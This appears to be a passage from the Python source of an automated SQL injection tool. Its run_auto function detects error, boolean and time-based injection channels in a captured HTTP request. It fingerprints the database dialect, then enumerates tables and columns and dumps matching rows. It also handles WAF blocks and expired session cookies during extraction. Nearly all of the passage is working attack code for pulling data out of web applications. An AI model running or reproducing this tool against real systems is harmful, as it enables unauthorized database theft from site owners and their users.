    timeout = cfg.timeout
    no_throttle = cfg.no_throttle
    if cfg.quiet:
        _print = lambda *a, **k: None
    else:
        _print = print
    # disclaimer is printed by helper.main(); avoid duplication
    _print(f"  target:    {campaign_dir}")
    global DEBUG, FAST, PARALLEL, SETTINGS
    DEBUG = debug
    FAST = fast
    PARALLEL = max(1, int(parallel))
    SETTINGS = {}

    # Resolve campaign dir once and wire up the debug log (if --debug).
    cdir = Path(campaign_dir).expanduser().resolve()
    if debug:
        dbg_path = dbg_init(cdir, enabled=True, echo=True,
                            save_bodies=False)
        dbg(f"# debug log for {cdir}")
        dbg(f"# python: {sys.version.split()[0]}")
    else:
        dbg_path = None

    # wire http_client from cfg (retries, throttle, max_total)
    from .http_client import (
        configure as _hc_configure,
        reset_worker_throttles as _reset_workers,
    )
    _hc_configure(cfg)
    _reset_workers()
    _probe_cache = ProbeCache(maxsize=10000)
    if debug:
        try:
            dbg(f"# probe cache enabled (maxsize=10000)")
        except Exception:
            pass

    # settings.json is already merged into cfg by helper.build_config_from_args.
    # Legacy callers (run_auto(campaign_dir, ...)) build cfg inline and
    # still need the merge, so we keep it here as a fallback.
    if not getattr(cfg, "_settings_merged", False):
        settings = _load_settings(Path(campaign_dir).expanduser().resolve())
        if settings:
            cfg.merge_settings(settings, explicit=set())
            cfg.apply_safe_defaults()
            print(f"  settings:  merged (fallback): {settings}")
        cfg._settings_merged = True
    PARALLEL = cfg.parallel
    delay = cfg.delay
    timeout = cfg.timeout
    print(f"  throttle:  rps={cfg.throttle_rps} "
          f"parallel={PARALLEL} delay={delay} timeout={timeout}")

    # cdir already resolved above
    if not cdir.is_dir():
        print(f"  !! not a directory: {cdir}")
        sys.exit(2)

    req_file = cdir / "request.txt"
    match_file = cdir / "match.txt"
    words_file = cdir / "words.txt"

    if not req_file.exists():
        print(f"  !! missing {req_file}")
        sys.exit(2)

    raw = req_file.read_text(encoding="utf-8")
    match = ""
    if match_file.exists():
        match = match_file.read_text(encoding="utf-8").strip()

    words = []
    if words_file.exists():
        words = [l.strip() for l in
                 words_file.read_text(encoding="utf-8").splitlines()
                 if l.strip()]

    print("=" * 68)
    print(f"  AUTO mode")
    print(f"  campaign:  {cdir}")
    print(f"  match:     {match!r}")
    print(f"  words:     {len(words)}")
    print(f"  limits:    TABLES_MAX={TABLES_MAX} COLUMNS_MAX={COLUMNS_MAX} "
          f"LENGTH_HI={LENGTH_HI}")
    print(f"  flags:     debug={debug} fast={fast} scan_all={scan_all}")
    if dbg_path is not None:
        print(f"  debug log: {dbg_path}")
    print("=" * 68)

    if MARKER in raw:
        # explicit marker path
        client = Client(raw, cfg)
        target = client.req.host + client.req.path
        print(f"  marker detected -> explicit flow")
        print(f"  target:    {target}")
        pr = Prober(client, cfg=cfg, marker=match, delay=delay,
                    debug=debug, campaign_dir=cdir,
                    cache=_probe_cache, worker_id=0,
                    parallel=PARALLEL)

        print("\n[auto-detect] error channel")
        er = auto_detect_error(pr)
        if er is not None:
            dialect, prefix, suffix, tname, tpl = er
            pr.technique = "error"
            pr.dialect = dialect
            pr.d = DIALECT[dialect]
            pr.prefix = prefix
            pr.suffix = suffix
            pr.error_template = tpl
        else:
            print("\n[auto-detect] boolean channel")
            b = auto_detect_boolean(pr, match)
            if b is not None:
                p, s = b
                pr.technique = "boolean"
                pr.prefix, pr.suffix = p, s
                print(f"  ==> boolean channel OK: prefix={p!r} suffix={s!r}")
            else:
                print("\n[auto-detect] time channel")
                t = auto_detect_time(pr)
                if t is None:
                    print("  !! no working channel found. Aborting.")
                    sys.exit(3)
                dialect, p, s = t
                pr.technique = "time"
                pr.prefix, pr.suffix = p, s
                pr.dialect = dialect
                pr.d = DIALECT[dialect]
                print(f"  ==> time channel OK: dialect={dialect} "
                      f"prefix={p!r} suffix={s!r}")
    else:
        # scanner path
        from .scanner import scan, build_request_for_point
        hits = scan(raw, delay=delay,
                    stop_on_first=not scan_all, verbose=debug)

        if hits:
            hit = hits[0]
            patched = build_request_for_point(raw, hit.point)
            client = Client(patched, cfg)
            target = client.req.host + client.req.path
            pr = Prober(client, cfg=cfg, marker=match, delay=delay,
                        debug=debug, campaign_dir=cdir,
                        cache=_probe_cache, worker_id=0,
                        parallel=PARALLEL)
            pr.technique = hit.channel
            pr.dialect = hit.dialect
            pr.d = DIALECT[hit.dialect]
            pr.prefix = hit.prefix
            pr.suffix = hit.suffix
            pr.error_template = hit.template_body
            print(f"\n  ==> using {hit.channel} channel on "
                  f"{hit.point.kind} '{hit.point.name}' "
                  f"(dialect={hit.dialect})")
        else:
            # Auto-boolean fallback:
            # try to derive a marker from a break-test-positive point.
            print("\n[auto-boolean] no error/time hit; trying auto marker")
            from .scanner import discover_points
            pts = discover_points(raw)
            # URL points rarely accept SQL directly (payload gets
            # appended to the value and breaks the request line).
            # Prefer cookie / body / header points where injection is
            # a plain string concatenation.
            points_to_try = [p for p in pts if p.kind in ("cookie",
                                                          "body", "header")]
            if not points_to_try:
                points_to_try = [p for p in pts if p.kind == "url"]
            if not points_to_try:
                print("  !! no candidate points.")
                sys.exit(3)

            client = Client(raw, cfg)
            found = False
            for p in points_to_try:
                print(f"  point {p.kind} '{p.name}'")
                for prefix, suffix in PREFIX_CANDIDATES:
                    marker = auto_bool_marker(
                        client, raw, p, prefix, suffix,
                        interactive=not non_interactive,
                        cfg=cfg)
                    if marker:
                        print(f"    auto marker: {marker!r} "
                              f"(prefix={prefix!r} suffix={suffix!r})")
                        patched = build_request_for_point(raw, p)
                        client = Client(patched, cfg)
                        pr = Prober(client, cfg=cfg, marker=marker,
                                    delay=delay, debug=debug,
                                    campaign_dir=cdir,
                                    cache=_probe_cache, worker_id=0,
                                    parallel=PARALLEL)
                        pr.technique = "boolean"
                        pr.prefix = prefix
                        pr.suffix = suffix
                        pr.dialect = "mysql"
                        pr.d = DIALECT["mysql"]

                        found = True
                        break
                if found:
                    break

            if not found:
                print("  !! auto-boolean could not derive a marker.")
                sys.exit(3)

            # fingerprint dialect after auto-boolean
            print('\n[auto-detect] dialect (post-boolean)')
            hits = []
            for db, frag in DIALECT.items():
                pr.d = frag
                pr.dialect = db
                ok = False
                for cond in frag['version_like']:
                    try:
                        if pr.probe(cond):
                            ok = True
                            break
                    except Exception:
                        pass
                print(f'  {db:9} -> {ok}')
                if ok:
                    hits.append(db)
            if hits:
                pr.dialect = hits[0]
                pr.d = DIALECT[hits[0]]
                print(f'  ==> dialect={pr.dialect}')
            else:
                print('  !! dialect not determined, keeping mysql')
                pr.dialect = 'mysql'
                pr.d = DIALECT['mysql']

    if not _preflight_sanity(pr, cfg):
        print("  !! sanity failed after auto-detect. Aborting.")
        sys.exit(3)

    print(f"\n  ==> dialect={pr.dialect}  technique={pr.technique}  "
          f"prefix={pr.prefix!r}  suffix={pr.suffix!r}")

    if dry_run:
        print("\n  --dry-run: stopping before extraction.")
        return

    res = Results(cdir, pr.dialect, pr.technique,
                  client.req.host + client.req.path)

    try:
        n_tables = step_count_tables(pr, res)
        if n_tables == 0:
            return

        tables = step_table_names(pr, n_tables, res)
        if not tables:
            return

        while True:
            print(f"\n  Tables known: {', '.join(tables)}")
            t = ask("Table to explore (or Enter to finish)", "")
            if not t:
                break
            if t not in tables:
                print("  ! not in list")
                continue

            n_cols = step_count_columns(pr, t, res)
            cols = step_column_names(pr, t, n_cols, res)

            step_count_rows(pr, t, res)

            if words and cols:
                key_col = ask(f"Column for wordlist check (in {t})", cols[0])
                hits = step_wordlist_check(pr, t, key_col, words, res)
                other = [c for c in cols if c != key_col]
                if hits and other:
                    step_dump_rows(pr, t, key_col, hits, other, res)

    except SessionExpired as e:
        print(f"\n  !! session expired: {e}")
        print("  refresh the session cookie in request.txt and re-run")
        sys.exit(4)
    except WafBlocked as e:
        print(f"\n  !! WAF blocked us: {e}")
        print("  wait a few minutes and lower --max-rps")
        sys.exit(5)
    except RateLimitHit as e:
        print(f"\n  !! local request limit: {e}")
        sys.exit(6)
    finally:
        res.close()
        print(f"\n  results -> {res.path}")
        print(f"  requests sent: {pr.requests}")
        if dbg_path is not None:
            dbg(f"# requests sent: {pr.requests}")
            dbg_close()


if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument("campaign_dir",
                    help="folder with request.txt / match.txt / words.txt")
    ap.add_argument("--delay", type=int, default=5)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--fast", action="store_true")
    ap.add_argument("--scan-all", action="store_true",
                    help="do not stop on first point; report all hits")
    a = ap.parse_args()

    run_auto(a.campaign_dir, a.delay, a.dry_run, a.debug, a.fast,
             a.scan_all)
